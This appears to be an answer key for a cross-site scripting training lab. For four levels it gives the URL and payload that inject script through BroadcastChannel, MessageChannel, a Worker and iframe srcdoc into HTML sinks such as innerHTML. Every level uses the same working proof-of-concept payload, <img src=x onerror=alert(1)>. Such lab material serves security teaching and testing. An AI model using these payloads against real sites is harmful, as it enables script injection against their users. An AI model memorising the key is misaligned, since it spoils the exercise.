# channel — solutions

Seed parameter relayed through web channels (BroadcastChannel, MessageChannel, Worker) into innerHTML / insertAdjacentHTML / createContextualFragment / srcdoc.

### channel-level1

`/channel/level1/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: seed posted on BroadcastChannel then innerHTML'd into #output

### channel-level2

`/channel/level2/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: MessageChannel port → insertAdjacentHTML

### channel-level3

`/channel/level3/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: Worker echoes seed → createContextualFragment appended (executes script-like nodes)

### channel-level4

`/channel/level4/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: seed JSON-wrapped, posted, then assigned to iframe srcdoc (HTML re-parsed)
